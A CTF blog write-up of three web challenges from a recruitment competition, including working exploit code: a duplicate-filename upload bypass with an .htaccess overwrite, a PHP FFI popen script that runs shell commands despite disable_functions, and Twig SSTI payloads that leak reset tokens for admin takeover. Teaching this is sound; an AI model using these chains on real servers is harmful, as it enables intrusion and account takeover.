---
title: "BKSEC TTV 2027 — Recruitment CTF Write-ups"
description: "How I solved three Web challenges in the BKSEC recruitment CTF: File manager, The other flag, and You've Got Mail."
date: 2026-11-23 10:00:00 +0700
lang: en
categories: [CTF, BKSEC]
tags: [ctf, bksec, writeup, web-exploitation, file-upload, php, ssti, twig]
toc: true
media_subpath: /assets/img/posts/2026-11-23-bksec-ttv-2027-writeups
pin: false
---

I recently took part in **BKSEC TTV 2027**, the club's recruitment CTF, held on **November 21–22, 2026**. This post walks through how I solved three Web challenges: **File manager**, **File Manager - The other flag**, and **You've Got Mail**.

I have kept the unsuccessful attempts too, since they helped me understand the applications and figure out what to try next. All payloads, credentials, and flags below belong to the competition challenges.

| Challenge | Category | Difficulty | Exploitation approach |
| --- | --- | --- | --- |
| File manager | Web | Medium | Exposed `.git`, duplicate filename handling, and overwriting `.htaccess` |
| File Manager - The other flag | Web | Medium | Calling native functions through PHP FFI and executing `/readflag` |
| You've Got Mail | Web | Easy | Twig SSTI, reset token disclosure, and admin account takeover |

## 1. File manager

### Challenge description

> Text-book vulnerability - I hope you can grab this easy challenge without AI. This challenges ALLOWS scanning!

### Trying to upload a PHP file

The website offers a few basic file management features: upload, rename, delete, and search. With my limited experience, my first idea was to upload a PHP script and use it to read the flag file.

![File Manager interface with its file management features](file-manager.webp)

But uploading a PHP file returned `file type not allowed`.

![The PHP file upload request is rejected](upload-blocked.webp)

I tried changing the `Content-Type`, replacing `.php` with `.php3`, `.php4`, `.phtml`, or `.phar`, and adding a null byte, but none of those worked. Appending another extension, such as in `namtran.php.txt`, finally let me upload the file.

![Successfully uploading a file with a double extension](upload-double-extension.webp)

Based on the `/upload.php` endpoint, I tried `/uploads/{file_name}` and found where the files were stored. Unfortunately, the server returned plain text rather than executing the PHP code inside.

### Fuzzing and recovering source code from `.git`

Since the challenge explicitly allowed scanning, I fuzzed paths using [SecLists' common.txt wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt). The results included some interesting paths, such as `.git` and `.env`.

![Fuzzing results for paths under the web root](fuzz-root.webp)

Fuzzing under `/uploads` also revealed an accessible `.htaccess` file.

![Fuzzing results for the uploads directory](fuzz-uploads.webp)

Its configuration included:

```apache
<FilesMatch "\.ph.*$">
    Require all denied
</FilesMatch>
```

This rule denies access to filenames matching the expression, including `.php`, `.php3`, `.phtml`, and even names such as `namtran.php.txt`. Simply getting a PHP file into the uploads directory would therefore not be enough.

I turned to the exposed `.git` directory and used `git-dumper` to recover the source code, including `upload.php`, `rename.php`, `lib.php`, `download.php`, and `.env`.

![Recovering the source code with git-dumper](git-dumper.webp)

### The flaw in duplicate filename handling

In `lib.php`, the application defines the upload directory and an extension blacklist:

```php
const UPLOAD_DIR = '/var/www/uploads';
const META_FILE   = '/var/www/data/files.json';
const BLOCKED_EXT = ['php', 'php2', 'php3', 'php4', 'php5', 'php6',
'php7', 'phps', 'phtml', 'pht', 'phar'];

function blocked(string $filename): bool
{
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return in_array($ext, BLOCKED_EXT, true);
}

function clean(string $name): string
{
    return basename(trim($name));
}
```

`clean()` trims whitespace from both ends and extracts the final filename component from the path. Meanwhile, `blocked()` uses `PATHINFO_EXTENSION` to get the extension after the last dot and checks it against the blacklist.

For example:

```php
$file = 'nam.php.txt';

echo pathinfo($file, PATHINFO_EXTENSION);
// txt

echo pathinfo($file, PATHINFO_FILENAME);
// nam.php

echo pathinfo($file, PATHINFO_BASENAME);
// nam.php.txt

echo pathinfo($file, PATHINFO_DIRNAME);
// .
```

That explains why `namtran.php.txt` passes the extension check. The next important piece is in `upload.php`:

```php
<?php

require __DIR__ . '/lib.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_FILES['file'])) {
    http_response_code(400);
    exit('bad request');
}

$original = clean($_FILES['file']['name']);
if ($original === '') {
    http_response_code(400);
    exit('missing filename');
}

if (blocked($original)) {
    http_response_code(415);
    exit('file type not allowed');
}

$name = $original;
while (file_exists(UPLOAD_DIR . '/' . $name)) {
    $base = pathinfo($name, PATHINFO_FILENAME);
    if ($base === $name || $base === '') {
        http_response_code(409);
        exit('could not store file');
    }
    $name = $base;
}

if (!move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $name)) {
    http_response_code(500);
    exit('storage error');
}

$meta = load_meta();
$id = bin2hex(random_bytes(4));
$meta[$id] = ['display' => $original, 'stored' => $name];
save_meta($meta);

header('Location: /index.php');
```

If the file already exists, the `while` loop removes the final extension and checks again. For `nam.php.jpg.txt`, for example, the names may be checked in this order:

```text
nam.php.jpg.txt → nam.php.jpg → nam.php → nam
```

The loop stops as soon as it finds a name that does not exist. However, the blacklist is checked only against the **original filename**, with no further validation after the name changes.

So, assuming neither `nam.php.txt` nor `nam.php` exists:

1. Upload `nam.php.txt` once: the server stores it under its original name.
2. Upload a file with the same name again: the server detects the collision, strips `.txt`, and saves it as `nam.php`.

I could now place a file ending in `.php` on the server. Next, I had to deal with the `.htaccess` rule blocking access to it.

### Overwriting `.htaccess` through rename

I tried uploading a new `.htaccess` file directly, replacing the blocking rule with:

```apache
AddHandler application/x-httpd-php .php
```

That failed too. Because `.htaccess` already exists, the server enters the duplicate filename loop; `pathinfo('.htaccess', PATHINFO_FILENAME)` returns an empty string, so the request is rejected.

![Directly uploading htaccess fails because the file already exists](htaccess-upload-failed.webp)

Then I remembered the rename feature. I uploaded the configuration under an ordinary filename and renamed it to `.htaccess`, successfully overwriting the old configuration.

![Renaming the uploaded configuration file to htaccess](rename-htaccess.webp)

After checking again, I could access and execute PHP files under `/uploads`.

![PHP execution after replacing the configuration](php-execution.webp)

### Reading the flag

The hint placed the flag at `/var/www/flag1.txt`, so the final payload only needed to read that file:

```php
<?php
$path = '/var/www/flag1.txt';
echo file_get_contents($path);
?>
```

I uploaded `6.php.txt` twice so that the second upload would be saved as `6.php`, then visited `/uploads/6.php`.

![Reading the first flag](flag1.webp)

```text
BKSEC{05b88a0a809f65ed7201781775c0ff8b_7054ca9839}
```

The key lesson here is that the filename changes **after the security check**. Combined with the ability to overwrite `.htaccess` through rename, the duplicate filename bug becomes a path to PHP execution.

## 2. File Manager - The other flag

### Challenge description

> yet another text-book things

### From PHP execution to inspecting the environment

The application uses the same processing logic as the previous challenge, so I reused the upload and `.htaccess` replacement chain. This time, however, the flag was no longer at the old path.

![Checking the old flag path in the second challenge](flag1-missing.webp)

I looked into command execution functions such as `exec`, `system`, and `shell_exec`, then uploaded this PHP script to inspect the environment:

```php
<?php
echo "PHP Version: " . PHP_VERSION . "\n\n";

echo "=== DISABLED FUNCTIONS ===\n";
echo ini_get('disable_functions') ?: 'None';

echo "\n\n=== AVAILABLE FUNCTIONS ===\n";

$functions = get_defined_functions();

foreach ($functions['internal'] as $function) {
    echo $function . "\n";
}
?>
```

The output showed that the server was running PHP **8.2.36** and had disabled most of the usual command execution functions.

![PHP version and disabled functions](disabled-functions.webp)

I checked a few more settings:

```php
<?php
$checks = [
    'PHP Version' => PHP_VERSION,
    'disable_functions' => ini_get('disable_functions'),
    'open_basedir' => ini_get('open_basedir'),
    'allow_url_fopen' => ini_get('allow_url_fopen'),
    'allow_url_include' => ini_get('allow_url_include'),
    'file_uploads' => ini_get('file_uploads'),
    'FFI enabled' => extension_loaded('FFI') ? 'YES' : 'NO',
    'FFI class' => class_exists('FFI', false) ? 'YES' : 'NO',
    'FFI enable setting' => ini_get('ffi.enable'),
];

foreach ($checks as $name => $value) {
    echo $name . ': ' . var_export($value, true) . "\n";
}
```

Finally, something stood out: **FFI was enabled**, the `FFI` class was available, and `ffi.enable` was set to `1`.

![Configuration showing that PHP FFI is enabled](ffi-enabled.webp)

### Calling native functions through PHP FFI

FFI (*Foreign Function Interface*) lets PHP interact with native libraries. In this challenge environment, I could call C functions from `libc.so.6` without using the disabled PHP functions.

I declared `popen`, `fgets`, and `pclose` to open a process through a pipe, read its output into a buffer, and close the pipe afterward.

```php
<?php

try {
    $ffi = FFI::cdef('
        typedef struct _IO_FILE FILE;
        FILE *popen(const char *command, const char *type);
        char *fgets(char *s, int size, FILE *stream);
        int pclose(FILE *stream);
    ', 'libc.so.6');

    $cmd = "id 2>&1";

    $fp = $ffi->popen($cmd, "r");

    if ($fp === null || FFI::isNull($fp)) {
        throw new Exception("popen failed");
    }

    $buffer = FFI::new("char[4096]");

    echo "<pre>";

    while (true) {
        $result = $ffi->fgets($buffer, 4096, $fp);

        if ($result === null || FFI::isNull($result)) {
            break;
        }

        echo htmlspecialchars(
            FFI::string($buffer),
            ENT_QUOTES | ENT_SUBSTITUTE,
            "UTF-8"
        );
    }

    echo "</pre>";

    $ffi->pclose($fp);

} catch (Throwable $e) {
    echo htmlspecialchars($e->getMessage());
}
```

`FFI::cdef()` declares C functions that PHP can call directly. The `"r"` mode in `$ffi->popen($cmd, "r")` lets me read the output of the command in `$cmd`; the `while` loop retrieves it through `fgets()`.

![Executing id through FFI](ffi-id.webp)

### Finding the flag and executing `/readflag`

Next, I changed `$cmd` to look for flag-related files in the root directory:

```php
$cmd = "find / -maxdepth 1 -type f -iname '*flag*' -print 2>&1";
```

The results included `/flag2` and `/readflag`. I checked their permissions:

```php
$cmd = "ls -lah /flag2 /readflag 2>&1";
```

```text
-r-------- 1 root root 60 Nov 22 02:53 /flag2
-rwsr-xr-x 1 root root 16K Nov 21 08:14 /readflag
```

Then I checked their file types:

```php
$cmd = "file /flag2 /readflag 2>&1";
```

```text
/flag2:    regular file, no read permission
/readflag: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=63f557a02f9dfee1b7d5104a488ca957ab0a3f8a, for GNU/Linux
3.2.0, not stripped
```

The current process could not read `/flag2`, but `/readflag` was an executable with the setuid bit set. I ran it:

```php
$cmd = "/readflag 2>&1";
```

And got the flag:

```text
BKSEC{man_i_hope_AI_did_not_help_you_solve_this_f6a52e9020}
```

This challenge reminded me that disabling familiar PHP functions with `disable_functions` does not cover native library calls when scripts are allowed to use FFI.

{% raw %}

## 3. You've Got Mail

### Challenge description

> I just vibe-coded a CRM with quite a few useful features for customers. Don't RCE pls.

The challenge provided a Staff account:

```text
Username: staff1
Password: staffpass123
```

### Identifying SSTI in Twig

The CRM includes login, password recovery, a dashboard, and account profile editing. The most interesting feature was **edit template**: it uses `{{ ... }}` to access data during preview, and the interface even displays **TWIG**.

![The CRM email template editor](mail-template.webp)

I tried two expressions:

```twig
{{7*7}}
{{7*'7'}}
```

![Testing multiplication expressions in the template preview](twig-test.webp)

In this challenge, both returned `49`. Together with the TWIG label in the interface, this confirmed Twig as the exploitation target. It is also a familiar way to distinguish it from Jinja2, where the second expression typically produces `7777777`.

I initially tried a few RCE payloads without success. Remembering the “Don't RCE pls” hint, I switched to **Information Disclosure**.

### Enumerating data in the template context

To identify the variables passed into the template, I used:

```twig
{{ _context|keys|join(', ') }}
```

![Enumerating variables in the template context](twig-context.webp)

One interesting object was `users`. I inspected its keys, followed by the fields of its first element:

```twig
{{ users|keys|join(', ') }}
{{ users[0]|keys|join(', ') }}
```

![Indices in the users object](twig-users.webp)

![User fields exposed through the template](twig-user-fields.webp)

There were four users, with fields worth investigating such as `role`, `password_hash_5531133f`, and `reset_token_9e5b84be`. The field names differ between screenshots: the initial enumeration shows the suffix `9e5b84be`, while later token reads use `126c324e`. Use the actual key returned by the context at the time. Checking the role showed that `users[0]` was the admin.

![Identifying the user with the admin role](twig-admin.webp)

I explored the password hash first. It used bcrypt; even after trying hashcat with a few wordlists, I could not recover the password.

The next avenue was the **reset token**, since the application already had a password recovery feature. Initially, the field was empty; submitting a reset request caused a token to be generated.

### Testing password reset with the Staff account

I tested the flow with the provided account first. Its profile page showed the email address `staff@nexacrm.local`.

![The Staff account email address on its profile page](staff-profile.webp)

After submitting a request at `/forgot-password`, I returned to the template to read the token.

```twig
{{ users[1].reset_token_126c324e }}
```

![The reset token appears after a password recovery request](staff-reset-token.webp)

Starting from `/forgot-password`, I tried changing the path to `/reset-password` and found a form for setting a new password using the token I had just obtained.

![Setting a new password with the reset token](reset-password.webp)

![Confirmation that the password was reset successfully](reset-success.webp)

This confirmed that a token read through the template could be used to change the account's password.

### Resetting the admin password and getting the flag

Based on the Staff email format, I guessed the admin email was `admin@nexacrm.local`. After submitting a reset request for that address, I retrieved the token from `users[0]`:

```twig
{{ users[0].reset_token_126c324e }}
```

![Reading the admin reset token through the template context](admin-reset-token.webp)

I used the token to set a new password, obtained the admin username from the exposed context data, and logged in to get the flag:

```text
BKSEC{ch3ck_7h3_c0n73x7_my_fr133nd_a2cef5eee0}
```

What I found interesting here is that SSTI does not need to lead to RCE to have a serious impact. Access to the user list and reset tokens from a template was enough to take over the admin account.

{% endraw %}
